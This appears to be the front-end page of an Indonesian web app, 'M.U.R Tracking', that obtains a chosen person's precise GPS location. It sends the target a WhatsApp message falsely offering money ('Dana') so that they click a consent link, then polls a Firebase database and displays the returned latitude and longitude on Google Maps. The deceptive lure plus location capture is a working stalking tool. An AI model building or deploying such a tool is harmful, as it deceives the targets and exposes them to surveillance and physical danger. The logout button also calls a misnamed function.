<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>M.U.R - Pelacakan</title>

<style>
*{
  box-sizing:border-box;
}

body{
  margin:0;
  font-family:Arial,sans-serif;
  background:teal;
  color:white;
  min-height:100vh;
}

.container{
  width:90%;
  max-width:500px;
  margin:40px auto;
}

h1{
  text-align:left;
  margin-bottom:10px;
  color: silver;
}

.user{
  text-align:center;
  color: black;
  margin-bottom:30px;
}

.card{
  background: #222;
  padding:20px;
  border-radius:15px;
}

input{
  width:100%;
  padding:14px;
  margin:10px 0;
  border:none;
  border-radius:8px;
  font-size:16px;
  background: black;
  color: teal;
}

button{
  width:100%;
  padding:14px;
  border:none;
  border-radius:8px;
  background: teal;
  color:white;
  font-size:16px;
  font-weight:bold;
  cursor:pointer;
}

button:active{
  transform:scale(.98);
}

.status{
  margin-top:20px;
  padding:15px;
  background: black;
  border-radius:10px;
  line-height:1.6;
  word-break:break-word;
  color:darkgray;
}

a{
  color:#4da6ff;
}
</style>
</head>

<body>

<div class="container">

<h1>M.U.R</br>TRACKING</h1>

<div class="user" id="userInfo">
Memuat akun...
</div>

<div class="card">

<input
  type="tel"
  id="targetNumber"
  placeholder="Nomor WhatsApp penerima"
>

<button onclick="kirimPermintaan()">
Minta Lokasi
</button>

<button
    onclick="keluarakun()"
    
  style="margin-top:12px; background:maroon;color: white;">keluar</button>


<div class="status" id="status">
Belum ada permintaan.
</div>

</div>

</div>

<script>

const FIREBASE_URL =
"https://mur-studio-default-rtdb.asia-southeast1.firebasedatabase.app/";

const HOSTING_URL =
"https://oralive04-del.github.io/Mur-apk-new/minta_izin.html";

let timerPemantauan = null;


/* =========================
   CEK LOGIN
========================= */

window.onload = function(){

  const sesi = localStorage.getItem("sesiMUR");

  if(!sesi){
    window.location.href = "index.html";
    return;
  }

  try{

    const dataSesi = JSON.parse(sesi);

    document.getElementById("userInfo").textContent =
      "Login sebagai: " + (dataSesi.username || "Pengguna");

  }catch(e){

    document.getElementById("userInfo").textContent =
      "Pengguna M.U.R";

  }


  // Pulihkan permintaan sebelumnya
  const tersimpan = localStorage.getItem("permintaanMUR");

  if(tersimpan){

    try{

      const data = JSON.parse(tersimpan);

      if(data.target && data.requestId){

        document.getElementById("status").innerHTML =
          "⏳ Menunggu persetujuan dari penerima...<br><br>" +
          "Nomor: " + data.target;

        mulaiPemantauan(data.target,data.requestId);

      }

    }catch(e){

      localStorage.removeItem("permintaanMUR");

    }

  }

};


/* =========================
   FORMAT NOMOR
========================= */

function normalisasiNomor(nomor){

  nomor = nomor.replace(/\D/g,"");

  if(nomor.startsWith("0")){
    nomor = "62" + nomor.substring(1);
  }

  if(nomor.startsWith("8")){
    nomor = "62" + nomor;
  }

  return nomor;
}


/* =========================
   KIRIM PERMINTAAN
========================= */

async function kirimPermintaan(){

  let nomor = document.getElementById("targetNumber").value.trim();

  nomor = normalisasiNomor(nomor);

  if(!nomor){

    document.getElementById("status").innerHTML =
      "❌ Masukkan nomor WhatsApp terlebih dahulu.";

    return;
  }


  const requestId =
    "MUR_" +
    Date.now() +
    "_" +
    Math.random().toString(36).substring(2,8);


  const path =
    "permintaan/" +
    encodeURIComponent(nomor) +
    "/" +
    encodeURIComponent(requestId) +
    ".json";


  const requestData = {

    status:"menunggu",

    nomor:nomor,

    requestId:requestId,

    createdAt:Date.now()

  };


  document.getElementById("status").innerHTML =
    "⏳ Mengirim permintaan...";


  try{

    const response = await fetch(
      FIREBASE_URL + path,
      {
        method:"PUT",

        headers:{
          "Content-Type":"application/json"
        },

        body:JSON.stringify(requestData)
      }
    );


    if(!response.ok){

      const errorText = await response.text();

      throw new Error(
        "Firebase " +
        response.status +
        ": " +
        errorText
      );

    }


    // Simpan agar bisa dipantau walaupun halaman dibuka ulang
    localStorage.setItem(
      "permintaanMUR",
      JSON.stringify({
        target:nomor,
        requestId:requestId
      })
    );


    const izinURL =
      HOSTING_URL +
      "?request=" +
      encodeURIComponent(requestId) +
      "&nomor=" +
      encodeURIComponent(nomor);


    const pesan =
      "seseorang menawarkan Dana untuk anda dari APLIKASI M.U.R.\n\n" +
      "Silakan buka link berikut dan pilih SETUJUI jika Anda bersedia:\n\n" +
      izinURL;


    const whatsappURL =
      "https://wa.me/" +
      nomor +
      "?text=" +
      encodeURIComponent(pesan);


    document.getElementById("status").innerHTML =
      "✅ Permintaan berhasil dibuat.<br><br>" +
      "📱 Membuka WhatsApp...<br>" +
      "⏳ Menunggu persetujuan penerima...";


    // Mulai memantau sebelum WhatsApp dibuka
    mulaiPemantauan(nomor,requestId);


    setTimeout(function(){

  window.open(whatsappURL, "_blank");

},700);


  }catch(error){

    console.error(error);

    document.getElementById("status").innerHTML =
      "❌ Gagal mengirim permintaan.<br><br>" +
      error.message;

  }

}


/* =========================
   PEMANTAUAN FIREBASE
========================= */

function mulaiPemantauan(nomor,requestId){

  if(timerPemantauan){
    clearInterval(timerPemantauan);
  }


  // Cek langsung
  cekPermintaan(nomor,requestId);


  // Cek setiap 3 detik
  timerPemantauan = setInterval(function(){

    cekPermintaan(nomor,requestId);

  },3000);

}


/* =========================
   CEK STATUS
========================= */

async function cekPermintaan(nomor,requestId){

  try{

    const path =
      "permintaan/" +
      encodeURIComponent(nomor) +
      "/" +
      encodeURIComponent(requestId) +
      ".json";


    const response = await fetch(
      FIREBASE_URL + path,
      {
        method:"GET",
        cache:"no-store"
      }
    );


    if(!response.ok){

      console.log(
        "Firebase GET:",
        response.status
      );

      return;
    }


    const data = await response.json();


    if(!data){

      return;
    }


    console.log("Status permintaan:",data);


    /* =========================
       DITOLAK
    ========================= */

    if(data.status === "ditolak"){

      clearInterval(timerPemantauan);

      localStorage.removeItem("permintaanMUR");

      document.getElementById("status").innerHTML =
        "❌ Permintaan ditolak oleh penerima.";

      return;
    }


    /* =========================
       DISETUJUI
    ========================= */

    if(data.status === "disetujui"){

  clearInterval(timerPemantauan);

  const latitude =
    data.latitude ?? data.lat;

  const longitude =
    data.longitude ?? data.lng;

  if(
    latitude === undefined ||
    longitude === undefined
  ){

    document.getElementById("status").innerHTML =
      "⚠️ Lokasi disetujui, tetapi koordinat tidak ditemukan.";

    return;
  }

  document.getElementById("status").innerHTML =
    "✅ Lokasi berhasil diterima!<br><br>" +

    "📍 Latitude: " +
    latitude +

    "<br>📍 Longitude: " +
    longitude +

    "<br><br>" +

    "<a target='_blank' href='https://www.google.com/maps?q=" +
    encodeURIComponent(
      latitude + "," + longitude
    ) +
    "'>" +

    "🗺️ Buka lokasi di Google Maps" +

    "</a>";

  localStorage.removeItem("permintaanMUR");

  return;
}

    /* =========================
       MASIH MENUNGGU
    ========================= */

    document.getElementById("status").innerHTML =
      "⏳ Menunggu persetujuan dari penerima...<br><br>" +

      "Nomor: " + nomor;

  }catch(error){

    console.error(
      "Gagal membaca Firebase:",
      error
    );

  }

}
function keluarAkun(){

  if(!confirm("Yakin ingin keluar dari akun?")){
    return;
  }

  if(timerPemantauan){
    clearInterval(timerPemantauan);
    timerPemantauan = null;
  }

  localStorage.removeItem("sesiMUR");
  localStorage.removeItem("permintaanMUR");

  window.location.replace("index.html");
}

</script>

</body>
</html>
